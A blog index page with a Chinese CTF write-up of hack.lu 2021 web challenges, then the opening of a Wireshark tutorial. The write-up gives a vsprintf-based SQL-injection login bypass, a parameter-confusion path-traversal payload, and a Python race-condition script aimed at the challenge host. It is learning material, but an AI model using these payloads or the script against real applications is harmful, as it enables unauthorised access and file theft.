<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">217</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/31/2021hack-lu/">2021hack.lu</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-31</time><div class="content"><h2 id="Diamond-Safe"><a href="#Diamond-Safe" class="headerlink" title="Diamond Safe"></a>Diamond Safe</h2><p>下载源码:</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031103819.png" alt="img"></p>
<p>虽然存在过滤函数<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211103210956.png" alt="img" style="zoom:67%;"></p>
<p>但是问题不大，因为存在格式化字符串漏洞<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031104724.png" alt="img" style="zoom:67%;"></p>
<p>我们的最终目的应该是构造出万能密码，然后成功登陆即可<br>阅读源码，可以发现%s后面会被替换成’%s’如果我们想成功登录，那么就要闭合前面的引号，逃逸出一个单引号<br>查询语句为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; where password&#x3D;sha1(%s) and name&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>

<p>如果我们此时仅输入单引号，那么就会被过滤函数给转义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">从&#39;变成\&#39;</span><br></pre></td></tr></table></figure>

<p>因为存在格式化字符串漏洞，我们可以利用这里%会吃字符的特性，吃掉\</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">&quot;name=&#x27;%\&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=vsprintf(<span class="subst">$a</span>,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">echo <span class="subst">$b</span>;</span></span><br><span class="line"><span class="string">#name=&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果我们可以在转义之前就插入<code>%&#39;</code>，那么后面转义后就变成<code>%\&#39;</code>，此时在经过vsprintf函数，就会变成只剩下单引号以后的内容<code>&#39;</code>,但此时会引起语法上报错，因为有两个%，但是后面只有一个参数，匹配不上，而在格式化字符串中匹配中没有<code>%1$&#39;</code>这个格式，将会被直接舍弃掉,这个就不会引起报错了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;name=&#x27;%\&#x27;%s&quot;</span>;</span><br><span class="line">$b=vsprintf($a,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">#Warning: vsprintf(): Too few arguments in</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;name=&#x27;%1$\&#x27;%s&quot;</span>;</span><br><span class="line">$b=vsprintf($a,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">#name=&#x27;&#x27;a</span></span><br></pre></td></tr></table></figure>

<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>来分析一下他代码的执行过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#先尝试password&#x3D;1%1$&#39;) or 1&#x3D;1#</span><br><span class="line">则(转义后)变成:</span><br><span class="line">1%$1\&#39;) or 1&#x3D;1#</span><br><span class="line">然后变成</span><br><span class="line">SELECT * FROM &#96;users&#96; where password&#x3D;sha1(&#39;1%1$\&#39;) or 1 &#x3D; 1#&#39;)</span><br><span class="line">此时还需要在经过sprintf才能消去%1$\让单引号逃逸出来，所以还要在post一次name让他在经过一次sprintf，此时即可登录成功</span><br><span class="line">最终payload</span><br><span class="line">password&#x3D;1%1$&#39;) or 1&#x3D;1#&amp;name&#x3D;a</span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104005441.png" alt="img" style="zoom:67%;">

<p>登陆成功以后仅仅只是个开始，再来看看源码，提供了下载功能，意味着我们可以文件下载来读取flag，但是存在一点，我们不知道secret，所以无法伪造那个sha加密，但是我们现在有现成的两个文件，他们有提供这个sha加密的结果<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104111112.png" alt="img" style="zoom:67%;"></p>
<p>但是如果我们直接传入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?h&#x3D;f2d03c27433d3643ff5d20f1409cb013&amp;file_name&#x3D;FlagNotHere.txt&amp;file_name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p>原本的的file_name将会直接被覆盖，就过不去后面的hash比对<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144104.png" alt="img"></p>
<p>所以这里就利用QUERY_STRING传入的不会urldecode，还有在php中空格会自动解析为_的特性把上面的payload改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?h&#x3D;f2d03c27433d3643ff5d20f1409cb013&amp;file_name&#x3D;FlagNotHere.txt&amp;file%20name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p> 此时可以发现，两个检测时值互相不覆盖<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144438.png" alt="img"></p>
<p>而后空格被解析为下划线，当面对两个file_name值的时候，php就会默认选择后者<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211104144505.png" alt="img"></p>
<p>此时就可以下载得到flag了</p>
<h2 id="NODENB"><a href="#NODENB" class="headerlink" title="NODENB"></a>NODENB</h2><p>注册登录以后，来看看源码，他使用的是redis的数据库，所以命令集都是redis的，并且可以直接调用，但是对于redis的命令都比较陌生，所以要学习一下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> db = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> asyncBinds = [</span><br><span class="line">    <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setnx&#x27;</span>, <span class="string">&#x27;incr&#x27;</span>, <span class="string">&#x27;exists&#x27;</span>, <span class="string">&#x27;del&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;hget&#x27;</span>, <span class="string">&#x27;hset&#x27;</span>, <span class="string">&#x27;hgetall&#x27;</span>, <span class="string">&#x27;hmset&#x27;</span>, <span class="string">&#x27;hexists&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sadd&#x27;</span>, <span class="string">&#x27;srem&#x27;</span>, <span class="string">&#x27;smembers&#x27;</span>, <span class="string">&#x27;sismember&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>主要看看和flag有关的，首先是创了一个用户叫做system，然后这里就是创建了一个note库？然后里面有个flag表，然后他有个字段title叫FLAG，值为FLAG，来自于前面定义的环境变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.hset(<span class="string">&#x27;uid:1&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">db.set(<span class="string">&#x27;user:system&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">db.setnx(<span class="string">&#x27;index:uid&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">db.hmset(<span class="string">&#x27;note:flag&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;Flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: FLAG,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>很明显，需要从这里得到，访问/notes/flag，接下来他会校验id</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/notes/:nid&#x27;</span>, ensureAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; nid &#125; = req.params;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">await</span> db.hasUserNoteAcess(req.session.user.id, nid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/notes&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="keyword">await</span> db.getNote(nid);</span><br><span class="line">    res.render(<span class="string">&#x27;note&#x27;</span>, &#123; note &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这里看一下他是如何进行校验的,第一个比较时肯定可以过的，第二个是比较用户名是否存在于对应的hash表</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> hasUserNoteAcess(uid, nid) &#123;</span><br><span class="line"><span class="comment">//Redis Sismember 命令判断成员元素是否是集合的成员,nid为flag，那一定是，这个是表里有的</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">await</span> db.sismember(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>, nid)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//Hexists 命令用于查看哈希表的指定字段是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">await</span> db.hexists(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, <span class="string">&#x27;hash&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// system user has no password</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>按照上面的逻辑，就是我们要先登录system的账号，然后才可以访问到flag，但是上面又说system是没有密码的，但是这里又需要你的密码是非空且为string，那么这里就是一个矛盾点了，怎么可能让password非空然后又符合空以后加密的hash值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!username || !password || <span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">       res.flash(<span class="string">&#x27;danger&#x27;</span>, <span class="string">&#x27;invalid username or password&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> res.status(<span class="number">400</span>).render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>但其实也不一定要登录，因为他验证的是会话的hash值，所以如果我们可以伪造得到这个会话，也是能达到最终目的,额很明显，伪造是不可能的，再回去看了一下上面的验证逻辑，他验证的函数是hexists，即在这个hash表中有没有这个hash值，如果没有的话，那就是true！那是不是存在当我们删除这个某个用户以后，他的session还在，但是已经没有这个hash值了呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">await</span> db.hexists(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, <span class="string">&#x27;hash&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// system user has no password</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>来看看他删除的过程，这里再贴一下创建的过程会理解的比较清楚一些</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> createUser(name, password) &#123;</span><br><span class="line">       <span class="keyword">const</span> isAvailable = <span class="keyword">await</span> db.setnx(<span class="string">`user:<span class="subst">$&#123;name&#125;</span>`</span>, <span class="string">&#x27;PLACEHOLDER&#x27;</span>);</span><br><span class="line">       <span class="keyword">if</span> (!isAvailable) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;user already exists!&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">const</span> uid = <span class="keyword">await</span> db.incr(<span class="string">&#x27;index:uid&#x27;</span>);</span><br><span class="line">       <span class="keyword">await</span> db.set(<span class="string">`user:<span class="subst">$&#123;name&#125;</span>`</span>, uid);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">const</span> hash = <span class="keyword">await</span> argon2.hash(password);</span><br><span class="line">       <span class="keyword">await</span> db.hmset(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>, &#123; name, hash &#125;);</span><br><span class="line">       <span class="keyword">return</span> uid;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>对比创建和删除，可以发现，当删除了uid以后，name和对应的hash也会删除，然后session是在后面删除的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> deleteUser(uid) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = <span class="keyword">await</span> helpers.getUser(uid);</span><br><span class="line">        <span class="keyword">await</span> db.set(<span class="string">`user:<span class="subst">$&#123;user.name&#125;</span>`</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">await</span> db.del(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> sessions = <span class="keyword">await</span> db.smembers(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:sessions`</span>);</span><br><span class="line">        <span class="keyword">const</span> notes = <span class="keyword">await</span> db.smembers(<span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>);</span><br><span class="line">        <span class="keyword">return</span> db.del([</span><br><span class="line">            ...sessions.map(<span class="function">(<span class="params">sid</span>) =&gt;</span> <span class="string">`sess:<span class="subst">$&#123;sid&#125;</span>`</span>),</span><br><span class="line">            ...notes.map(<span class="function">(<span class="params">nid</span>) =&gt;</span> <span class="string">`note:<span class="subst">$&#123;nid&#125;</span>`</span>),</span><br><span class="line">            <span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:sessions`</span>,</span><br><span class="line">            <span class="string">`uid:<span class="subst">$&#123;uid&#125;</span>:notes`</span>,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>而在这个模块中，有延时存在，进入flash以后会对session进行操作，可以理解为暂时替我们保留了一会session</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.random) &#123;</span><br><span class="line">        <span class="keyword">const</span> ms = <span class="built_in">Math</span>.floor(<span class="number">2000</span> + <span class="built_in">Math</span>.random() * <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span><br><span class="line">        res.flash(<span class="string">&#x27;info&#x27;</span>, <span class="string">`Our AI ran <span class="subst">$&#123;ms&#125;</span>ms to generate this piece of groundbreaking research.`</span>);</span><br><span class="line">        content = <span class="string">&#x27;Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>创建用户，然后启用延时功能，在删除该用户的同时，使用它的session访问notes/flag表，但是我试了几次都没成功，想着会不会是手速不够快？这里涉及到多进程并行的情况，学习一下这个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">multiprocessing</span>.<span class="title">Process</span>(<span class="params">group=None, target=None, name=None, args=(<span class="params"></span>), kwargs=&#123;&#125;, *, daemon=None</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">start</span>()方法启动，这样创建进程比<span class="title">fork</span>()还要简单。</span></span><br><span class="line"><span class="class"><span class="title">join</span>()方法可以等待子进程结束后再继续往下运行(<span class="params">更准确地说，在当前位置阻塞主进程，带执行join（）的进程结束后再继续执行主进程</span></span></span><br><span class="line"><span class="class"><span class="params"><span class="comment">#这里说一下join方法，比如说有主进程和a和在执行，那么就是主进程执行然后紧跟着a.start()，遇到a.join()就会先阻塞主进程，等到a执行完毕，再执行主进程                       </span></span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://nodenb.flu.xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">u,p</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:u,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:p</span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url+<span class="string">&#x27;/register&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">u,p</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:u,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:p</span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url+<span class="string">&#x27;/login&#x27;</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteme</span>():</span></span><br><span class="line">    r=s.post(url+<span class="string">&quot;/deleteme&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    r=s.get(url+<span class="string">&quot;/notes/flag&quot;</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep_notes</span>(<span class="params">title,content,s</span>):</span></span><br><span class="line">    p=<span class="string">&quot;/notes?random=true&quot;</span></span><br><span class="line">    r=s.post(url+p,data=&#123;<span class="string">&#x27;title&#x27;</span>:title,<span class="string">&#x27;content&#x27;</span>:content&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = requests.session()</span><br><span class="line">        u = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        p = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        r1=register(u,p)</span><br><span class="line">        l1=login(u,p)</span><br><span class="line">        print(<span class="string">&quot;a&quot;</span>,s.cookies)</span><br><span class="line">        c=s.cookies.get(<span class="string">&quot;connect.sid&quot;</span>)</span><br><span class="line">        p=Process(target=sleep_notes,args=(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,s))</span><br><span class="line">        p.start()</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        d=deleteme()</span><br><span class="line">        p.join()</span><br><span class="line">        s.cookies.update(&#123;<span class="string">&quot;connect.sid&quot;</span>:c&#125;)</span><br><span class="line">        r=get_flag()</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">&quot;flag&quot;</span>,r.text):</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后还是没出来。头晕了–</p>
<h2 id="trading-api-High"><a href="#trading-api-High" class="headerlink" title="trading-api(High)"></a>trading-api(High)</h2><p>js文件有点多，从页面入手吧，一开始他说我们没有tooken</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authn</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> authHeader = req.header(<span class="string">&#x27;authorization&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!authHeader) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;missing auth token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        req.user = jsonwebtoken.verify(authHeader, JWT_SECRET);</span><br><span class="line">        next();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">401</span>).send(<span class="string">&#x27;invalid auth token&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以来看看login的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async function login(req, res) &#123;</span><br><span class="line">    const &#123; username, password &#125; &#x3D; req.body;</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        return res.status(400).send(&#39;missing username or password&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        const r &#x3D; await got.post(&#96;$&#123;AUTH_SERVICE&#125;&#x2F;api&#x2F;users&#x2F;$&#123;encodeURI(username)&#125;&#x2F;auth&#96;, &#123;</span><br><span class="line">            headers: &#123; authorization: AUTH_API_TOKEN &#125;,</span><br><span class="line">            json: &#123; password &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">        if (r.statusCode !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">            return res.status(401).send(&#39;wrong&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const jwt &#x3D; jsonwebtoken.sign(&#123; username &#125;, JWT_SECRET);</span><br><span class="line">        return res.json(&#123; token: jwt &#125;);</span><br><span class="line">    &#125; catch (error) &#123;</span><br><span class="line">        return res.status(503).end(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/20/wireshark%E5%B7%A5%E5%85%B7%E6%93%8D%E4%BD%9C/">wireshark工具操作</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-20</time><div class="content"><h1 id="Wireshark使用教程（界面说明、捕获过滤器表达式、显示过滤器表达式）"><a href="#Wireshark使用教程（界面说明、捕获过滤器表达式、显示过滤器表达式）" class="headerlink" title="Wireshark使用教程（界面说明、捕获过滤器表达式、显示过滤器表达式）"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lsdb/p/9254544.html">Wireshark使用教程（界面说明、捕获过滤器表达式、显示过滤器表达式）</a></h1><h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><h3 id="1-1-背景说明"><a href="#1-1-背景说明" class="headerlink" title="1.1 背景说明"></a>1.1 背景说明</h3><p>对于大多数刚开始接触wireshark的使用者而言，经常是开始的时候时候看到wireshark能把所有数据包都拦截下来觉得强无敌，但是面对一大堆的数据包要问有什么用或者说想要找到我想要的那些数据包怎么找（比如telnet登录过程的那些数据包）则完全是一脸茫然。</p>
<p>一是界面一堆窗口，什么作用什么区别看不懂；二是捕获、显示过滤器表达示看不出有什么规律，每次过滤都要百度找半天。其实wireshark界面还是比较清晰的，过滤器表过示也不困难，我们今天就来破解这wireshark使用的两大难题。</p>
<p>官网地址：<a target="_blank" rel="noopener" href="https://www.wireshark.org/">https://www.wireshark.org/</a></p>
<p>官网下载地址：<a target="_blank" rel="noopener" href="https://www.wireshark.org/#download">https://www.wireshark.org/#download</a></p>
<p>安装就不多说了和一般windows一样下一步下一下装就可以了。另外ethereal为什么在2006年更名wireshark参见：<a target="_blank" rel="noopener" href="https://www.linux.com/news/ethereal-changes-name-wireshark">https://www.linux.com/news/ethereal-changes-name-wireshark</a></p>
<h3 id="1-2-拦截本地回环数据"><a href="#1-2-拦截本地回环数据" class="headerlink" title="1.2 拦截本地回环数据"></a>1.2 拦截本地回环数据</h3><p>另外注意本机访问本机的回环数据是不经过网卡的，比如我们在本机访问搭建在本机上的web服务，但我们经常有服务搭建在本机的操作也经常有拦截本地回环数据包加以分析的需求，所以我们环要拦载回环数据包。操作如下。</p>
<p>首先，以管理员身份运行cmd（普通用户没有路由表操作权限，会提示“请求的操作需要提升”）</p>
<p>然后，使用ipconfig查看本机ip和网关：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p>再然后，使用以下命令添加路由，指定回环数据也要先转发到网关（使用上一步获取本的本机ip和网关替换其中的<your_IP>和<gateway_IP>）：</gateway_IP></your_IP></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route add &lt;your_IP&gt; mask 255.255.255.255 &lt;gateway_IP&gt; metric 1</span><br></pre></td></tr></table></figure>

<p>最后，查看路由表中路由是否已添加成功：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure>

<p>回环数据经网关再回来会增加网卡的压力，可使用以下命令删除路由（使用前边获取本的本机ip替换其中的<your_IP>）：</your_IP></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route delete &lt;your_IP&gt;</span><br></pre></td></tr></table></figure>



<h2 id="二、Wireshark界面说明"><a href="#二、Wireshark界面说明" class="headerlink" title="二、Wireshark界面说明"></a>二、Wireshark界面说明</h2><p>过滤器表达式书写是wireshark使用的核心，但在此之前，很多初学者还会碰到一个难题，就是感觉wireshark界面上很多东西不懂怎么看。其实还是挺明了的我们下面简单说一下，如下图。</p>
<p>1号窗口展示的是wireshark捕获到的所有数据包的列表。注意最后一列Info列是wireshark组织的说明列并不一定是该数据包中的原始内容。</p>
<p>2号窗口是1号窗口中选定的数据包的分协议层展示。底色为红色的是因为wireshark开启校验和验证而该层协议校验和又不正确所致。</p>
<p>3号窗口是1号窗口中选定的数据包的源数据，其中左侧是十六进制表示右侧是ASCII码表示。另外在2号窗口中选中某层或某字段，3号窗口对应位置也会被高亮。</p>
<p><img src="https://img2018.cnblogs.com/blog/1116722/201904/1116722-20190416142111502-1061169984.png" alt="img"></p>
<p>被认为最难的其实还是2号窗口展开后的内容不懂怎么看，其实也很明了，以IP层为例：</p>
<p>每一行就对应该层协议的一个字段；中括号行是前一字段的说明。</p>
<p>冒号前的英文是协议字段的名称；冒号后是该数据包中该协议字段的值。</p>
<p><img src="https://img2018.cnblogs.com/blog/1116722/201904/1116722-20190416143742948-32119959.png" alt="img"></p>
<h2 id="三、捕获过滤器表达式"><a href="#三、捕获过滤器表达式" class="headerlink" title="三、捕获过滤器表达式"></a>三、捕获过滤器表达式</h2><p>捕获过滤器表达式作用在wireshark开始捕获数据包之前，只捕获符合条件的数据包，不记录不符合条件的数据包。</p>
